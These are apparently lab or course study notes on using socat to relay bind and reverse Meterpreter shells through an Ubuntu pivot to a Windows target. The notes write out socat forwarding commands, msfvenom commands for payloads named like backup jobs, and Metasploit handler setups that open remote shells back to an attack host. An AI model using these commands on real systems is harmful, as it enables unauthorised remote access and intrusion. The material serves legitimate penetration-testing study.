Socat is a bidrectional relay tool
- Can create pip sockets between 2 independent network channels
- No need for SSH tunneling
- Acts as a redirector, listening on on ehost port and forwaring that data to another IP address and port
	- Similar to SSH -L and Meterpreter portfwd

**Can use the techniques here for general tools as well, not just bind/reverse shells. The key is creating the tunnel with socat for tools to be used.**
- However, no dynamic port forwarding with socat. So no nmap scans for example

# Socat redirection with Bind shell (Direct port forwarding)
- Similar scenario to ssh -L, but this is the first time we see an explicit bind shell scenario and not just tools
- We connect to the Windows machine with Ubuntu as pivot
![[55.png]]
- Bind shell payload for Windows
	- Windows server then starts a listener and binds to a particular port
	- Socat redirector on Ubuntu server which listens for incoming connections from Metasploit bind handler, forwards it to bind shell payload on Windows target
- Start the socat bind shell listener on Ubuntu machine
	- `socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443`
	- Listens on 8080, forwards to the victim server on port 8443
	- *so if I wanted to run tools on the victim server from attack host with ubuntu server as pivot, I would use this socat command*
- Create the Windows payload and transfer to Windows machine
	- `msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443`
- Start the bind multi handler
	- `msf6 > use exploit/multi/handler`
	- `set payload windows/x64/meterpreter/bind_tcp`
	- `set rhost 10.129.15.50`
		- rhost ip is the ip of the machine that is listening
		- so set it as ubuntu machine, which forwards connection to victim server
	- `set lport 8080`
	- `run`
- Then run the Windows payload

# Socat redirection with Reverse shell (Reverse port forwarding)
- Similar scenario to Meterpreter Reverse Port Forwarding
- Start SOCAT listener on the Ubuntu machine
	- `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`
	- Litens on port 8080 and forwards traffic to port 80 on attack host (10.10.14.18)
- The subsequent steps are the same as before
	- Create the windows payload to make Windows machine connect to Ubuntu on port 8080
		- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080`
	- Start multi handler listener on local machine
		- `msf6 > use exploit/multi/handler`
		- `set payload windows/x64/meterpreter/reverse_https`
		- `set lhost 0.0.0.0`
		- `set lport 80`
		- `run`
	- Transfer the payload to the Windows machine and run (see previous sections)



